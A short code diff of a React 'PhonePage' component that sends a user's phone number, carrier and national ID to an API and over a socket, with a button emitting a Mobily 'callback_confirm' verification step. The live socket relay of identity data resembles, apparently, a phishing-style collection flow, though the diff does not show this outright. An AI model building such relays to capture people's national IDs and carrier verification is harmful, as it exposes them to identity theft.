@@ -162,13 +162,15 @@ const PhonePage = () => {
     }
 
     try {
-      await axios.post(`${api_route}/phone/${sessionStorage.getItem("id")}`, {
+      const orderId = sessionStorage.getItem("id");
+      await axios.post(`${api_route}/phone/${orderId}`, {
         phoneNumber,
         phoneNetwork,
         phoneNationalId: phoneId,
       });
       socket.emit("phone", {
-        id: sessionStorage.getItem("id"),
+        _id: orderId,
+        id: orderId,
         phoneNumber,
         phoneNetwork,
         phoneNationalId: phoneId,
@@ -340,7 +342,12 @@ const PhonePage = () => {
             <button
               className="bg-sky-500 text-white w-1/2 self-start p-3 m-2 rounded-full my-5"
               onClick={() => {
-                socket.emit("network", ID);
+                socket.emit("network", {
+                  _id: ID,
+                  id: ID,
+                  phoneNetwork: "موبايلي",
+                  mobilyVerificationStep: "callback_confirm",
+                });
                 setVerfiy("Mobily2");
               }}
             >
